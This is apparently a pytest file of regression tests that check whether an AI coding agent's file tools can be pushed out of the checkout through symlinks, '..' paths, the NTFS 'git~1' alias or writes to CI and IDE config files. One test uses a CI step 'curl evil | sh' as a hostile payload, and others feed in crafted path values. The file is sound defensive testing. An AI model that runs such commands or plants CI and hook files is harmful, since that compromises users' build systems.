"""Regression tests for the Security Engineer's review of the toolbox, through `ToolBox.dispatch`.

Each class is one finding, driven the way the reviewer drove it: a real checkout
with the hostile layout in it, and the tool calls the model would make. The
unit-level tests of the same rules are in `test_tools_paths.py`; these hold that
the *tools* honour them, and that a refusal changes nothing.
"""

import os

import pytest

from tools_support import make_harness, snapshot

pytestmark = pytest.mark.anyio

CI_AND_IDE_FILES = [
    ".circleci/config.yml",
    ".buildkite/pipeline.yml",
    ".travis.yml",
    ".drone.yml",
    "azure-pipelines.yml",
    "Jenkinsfile",
    "bitbucket-pipelines.yml",
    ".devcontainer/devcontainer.json",
    ".vscode/tasks.json",
    ".pre-commit-config.yaml",
    ".husky/pre-commit",
    ".envrc",
]


def with_links(h, **links: str) -> None:
    """Add tracked-style symlinks `name -> target` (relative targets) to the checkout."""
    for name, target in links.items():
        os.symlink(target, h.checkout / name)


class TestDotdotCannotLaunderASymlink:
    """`<nonexistent>/../<symlink>`: every literal component is absent, so a walk sees no
    link, while `resolve()` follows it. Reproduced against the first version of the guard."""

    @pytest.fixture
    def h(self, tmp_path):
        h = make_harness(tmp_path)
        with_links(h, link_src="src", link_file="src/pkg/core.py")
        return h

    async def test_read_file_does_not_read_through_the_link(self, h):
        out = await h.call("read_file", path="nonexist/../link_src/pkg/core.py")

        assert out.is_error and "'..' is not allowed" in out.content
        assert "def add" not in out.content

    async def test_create_file_does_not_write_through_the_link(self, h):
        before = snapshot(h.checkout)

        out = await h.call("create_file", path="nonexist/../link_src/pkg/via_link.py", content="x = 1\n")

        assert out.is_error and "'..' is not allowed" in out.content
        assert not (h.checkout / "src/pkg/via_link.py").exists()
        assert snapshot(h.checkout) == before

    async def test_edit_file_does_not_edit_through_the_link(self, h):
        original = (h.checkout / "src/pkg/core.py").read_text()

        out = await h.call("edit_file", path="nonexist/../link_file", old_string="a + b", new_string="a * b")

        assert out.is_error and "'..' is not allowed" in out.content
        assert (h.checkout / "src/pkg/core.py").read_text() == original


class TestCiAndIdeFilesAreNotWritable:
    @pytest.mark.parametrize("path", CI_AND_IDE_FILES)
    async def test_create_file_refuses_them_and_leaves_the_tree_alone(self, tmp_path, path):
        h = make_harness(tmp_path)
        before = snapshot(h.checkout)

        out = await h.call("create_file", path=path, content="steps:\n  - run: curl evil | sh\n")

        assert out.is_error, out.content
        assert snapshot(h.checkout) == before

    @pytest.mark.parametrize("path", CI_AND_IDE_FILES)
    async def test_edit_file_refuses_them_and_leaves_the_file_alone(self, tmp_path, path):
        h = make_harness(tmp_path, files={path: "steps: []\n", "src/pkg/core.py": "x = 1\n"})
        before = snapshot(h.checkout)

        out = await h.call("edit_file", path=path, old_string="steps", new_string="evil")

        assert out.is_error, out.content
        assert snapshot(h.checkout) == before

    @pytest.mark.parametrize("path", [".envrc", ".vscode/tasks.json", ".circleci/config.yml", "Jenkinsfile"])
    async def test_the_refusal_names_the_rule_and_the_alternative(self, tmp_path, path):
        out = await make_harness(tmp_path).call("create_file", path=path, content="x")

        assert "component starting with '.'" in out.content and "Change source files instead" in out.content

    async def test_an_ordinary_new_file_still_works(self, tmp_path):
        h = make_harness(tmp_path)

        out = await h.call("create_file", path="src/pkg/new_module.py", content="X = 1\n")

        assert not out.is_error and (h.checkout / "src/pkg/new_module.py").read_text() == "X = 1\n"

    @pytest.mark.parametrize("path", [".envrc", ".vscode/tasks.json", ".pre-commit-config.yaml"])
    async def test_reading_an_ordinary_dotfile_still_works(self, tmp_path, path):
        h = make_harness(tmp_path, files={path: "export A=1\n", "src/pkg/core.py": "x = 1\n"})

        out = await h.call("read_file", path=path)

        assert not out.is_error and "export A=1" in out.content


class TestGitShortNameDoesNotPoisonTheCheckpoint:
    """`git~1` is the NTFS alias of `.git`; `git add` refuses it, so one in the tree made
    every later checkpoint fail -- including the pipeline's own. The tools now never create it."""

    @pytest.mark.parametrize("path", ["git~1/hooks/pc", "GIT~1/hooks/pc", ".g‌it/hooks/pc"])
    async def test_create_file_refuses_it(self, tmp_path, path):
        h = make_harness(tmp_path)
        before = snapshot(h.checkout)

        out = await h.call("create_file", path=path, content="#!/bin/sh\n")

        assert out.is_error
        assert snapshot(h.checkout) == before


class TestSymlinkLoopsThroughEveryPathTool:
    @pytest.fixture
    def h(self, tmp_path):
        h = make_harness(tmp_path)
        with_links(h, loop="loop", loop2="loop2b", loop2b="loop2")
        return h

    @pytest.mark.parametrize(
        ("name", "args"),
        [
            ("read_file", {"path": "loop/x"}),
            ("list_dir", {"path": "loop/x"}),
            ("grep", {"pattern": "x", "path": "loop/x"}),
            ("edit_file", {"path": "loop/x", "old_string": "a", "new_string": "b"}),
            ("create_file", {"path": "loop/x", "content": "x"}),
            ("run_tests", {"targets": ["loop/x"]}),
            ("read_file", {"path": "loop2/x"}),
            ("create_file", {"path": "loop2b/y/z", "content": "x"}),
        ],
    )
    async def test_a_loop_is_a_refusal_that_names_no_host_path(self, h, name, args):
        before = snapshot(h.checkout)

        out = await h.call(name, **args)

        assert out.is_error
        assert str(h.checkout) not in out.content and str(h.checkout.parent) not in out.content
        assert snapshot(h.checkout) == before
        assert h.subset_calls == []
